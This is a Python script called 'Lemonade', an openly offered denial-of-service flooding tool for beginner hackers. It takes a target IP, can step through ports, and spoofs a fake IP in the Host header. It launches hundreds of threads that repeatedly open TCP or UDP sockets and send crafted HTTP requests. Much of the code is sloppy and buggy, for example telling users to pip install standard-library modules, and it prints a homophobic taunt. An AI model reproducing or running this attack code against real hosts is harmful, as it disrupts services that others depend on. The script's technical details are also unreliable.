import time
import os
import sys
import random
import argparse

using_datetime = True

try:
  import socket
  from socket import *
  
except ImportError: 
  input(
      f"Module socket not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install socket.\npress enter to exit")
  exit()

try:
  import threading
  
except ImportError: 
  input(
      f"Module threading not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install threading.\npress enter to exit")
  exit()
  
try:
  import colorama
  from colorama import init, Fore, Back, Style
  
except ImportError: 
  input(
      f"Module colorama not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install colorama.\npress enter to exit")
  exit()
  
try:
  import datetime  
except ImportError:
  input(
      f"Module rdatetimenot installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install rdatetime\nPif you don't want to install datetime module you can proces the attack!")
  using_datetime = False


#if using_datetime is True:
  #now = datetime.now()
  #min = now.minute
  #hour = now.hour
  #day = now.hour
  #month = now.month
  #year = now.month

print("Simp on Lemonade1S#5327 and CNJ#0516 or you’re Gay! >_<")
time.sleep(1)
os.system("clear")
os.system("cls")

print("""
                                                              
                                                          H
 __       _____   ______________   ________   __________o===o__     ______    _____
|  |     |  ___| |   __    __   | |        | |    __    ||H|_   \  |       \ |  ___|
|  |___  |  ___| |  |  |  |  |  | |    —   | |   |  |   ||H|_ \  | |   —   | |  ___| 
|______| |_____| |_ |  |_ |  |_ | |________| |__ |  |__ ||H|   |_| |_______/ |_____|
                                                         |H|
                                                          V
                                                          
      """)

def main():
  parser = argparse.ArgumentParser(description = "Lemonade is a simple hacking console with cool features for begginer hackers! made by pastlecry#8645")

  parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
  parser.add_argument('--PORT', '--P', type = str, default = 'auto', help = 'Port')
  parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
  parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fake IP')
  parser.add_argument('--TIMESLEEP', '--TS', type = int, default = '1', help = 'Time sleep')
  parser.add_argument('--THREADING', '--H', type = int, default = '500', help = 'Threading')
  parser.add_argument('--INFORMATION', '--I', help = 'Threading', action = 'store_true')
  parser.add_argument('--AINFORMATION', '--AI', help = 'Threading', action = 'store_true')

  arguments = parser.parse_args()

  ip = arguments.TARGET
  fake_ip = arguments.FAKEIP
  porty = arguments.PORT
  protocol = arguments.PROTOCOL
  s_t = arguments.TIMESLEEP
  threading_count = arguments.THREADING


  bytes = random._urandom(1490)

  #os.system("clear")
  #sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
  #os.system ("clear") 

  def attack():
    pocket = 0
    
    while True:
      if protocol == "TCP": 
        s = socket(AF_INET, SOCK_STREAM)
      elif protocol == "UDP":
        s = socket(AF_INET, SOCK_DGRAM)
      else:
        print("undefined protocol!, Ctrl + C to close!")

      if porty == "auto":
        port = 80

      try:
        s.connect((ip, port))
        #s.send(bytes)
        s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
        pocket += 1
        print(f"pocket{pocket}")
        time.sleep(int(s_t))

        if porty == "auto":
          port = port + 1
          if port == 65543:
            port = port - 1

      except:
        print("connection faild!\npress ctrl/c to close or press Enter to process the attack!")
        return

      s.close() 

  init(autoreset=True)

  if arguments.INFORMATION:
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
    print("\n")
    print(Style.BRIGHT + Fore.RED + "Target ip : " + Style.BRIGHT + Fore.WHITE + ip)
    print(Style.BRIGHT + Fore.GREEN + "Port : " + Style.BRIGHT + Fore.WHITE + porty)
    print(Style.BRIGHT + Fore.YELLOW + "protocol : " + Style.BRIGHT + Fore.WHITE + protocol)
    print("\n")
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
  
  if arguments.AINFORMATION:
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
    print("\n")
    print(Style.BRIGHT + Fore.RED + " Target ip : " + Style.BRIGHT + Fore.WHITE + ip)
    print(Style.BRIGHT + Fore.GREEN + " Port : " + Style.BRIGHT + Fore.WHITE + porty)
    print(Style.BRIGHT + Fore.YELLOW + " protocol : " + Style.BRIGHT + Fore.WHITE + protocol)
    print(Style.BRIGHT + Fore.BLUE + " Fake ip : " + Style.BRIGHT + Fore.WHITE + fake_ip)
    print(Style.BRIGHT + Fore.MAGENTA + " Sleep time : " + Style.BRIGHT + Fore.WHITE + str(s_t))
    print(Style.BRIGHT + Fore.CYAN + " Threading : " + Style.BRIGHT + Fore.WHITE + str(threading_count))
    print("\n")
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")

  time.sleep(2)
  input("Press Enter to attack when you're ready!")
  if threading_count == "none":
    attack()
  else:
    for i in range(threading_count):
      thread = threading.Thread(target = attack)
      thread.start()
      
if __name__ == "__main__":
  main()
